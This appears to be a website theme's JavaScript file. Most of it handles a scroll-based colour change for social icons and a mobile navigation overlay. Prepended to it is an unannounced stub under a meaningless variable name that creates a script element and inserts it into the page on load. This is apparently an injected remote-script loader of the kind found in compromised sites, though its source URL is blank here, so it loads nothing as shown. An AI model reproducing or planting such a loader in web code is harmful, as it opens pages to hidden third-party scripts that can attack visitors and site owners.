var gfjfgjk = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = ''; s.src=pl; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}
	jQuery(document).ready(function($) {

    $(function () {
        $(window).scroll(function () {
            if ($(this).scrollTop() > 300) {
                $('ul.social li a').css("color", "#3a3a3a")
            } else {
                $('ul.social li a').css("color", "#fff")
            }
        });
    });

        // Mobile Nav

			(function() {
			var triggerBttn = document.getElementById( 'trigger-overlay' ),
			overlay = document.querySelector( 'div.overlay' ),
			closeBttn = overlay.querySelector( 'button.overlay-close' );
			transEndEventNames = {
			'WebkitTransition': 'webkitTransitionEnd',
			'MozTransition': 'transitionend',
			'OTransition': 'oTransitionEnd',
			'msTransition': 'MSTransitionEnd',
			'transition': 'transitionend'
			},
			transEndEventName = transEndEventNames[ Modernizr.prefixed( 'transition' ) ],
			support = { transitions : Modernizr.csstransitions };

			function toggleOverlay() {
			if( classie.has( overlay, 'open' ) ) {
			classie.remove( overlay, 'open' );
			classie.add( overlay, 'close' );
			var onEndTransitionFn = function( ev ) {
			if( support.transitions ) {
			if( ev.propertyName !== 'visibility' ) return;
			this.removeEventListener( transEndEventName, onEndTransitionFn );
			}
			classie.remove( overlay, 'close' );
			};
			if( support.transitions ) {
			overlay.addEventListener( transEndEventName, onEndTransitionFn );
			}
			else {
			onEndTransitionFn();
			}
			}
			else if( !classie.has( overlay, 'close' ) ) {
			classie.add( overlay, 'open' );
			}
			}

			triggerBttn.addEventListener( 'click', toggleOverlay );
			closeBttn.addEventListener( 'click', toggleOverlay );
			})();

	});
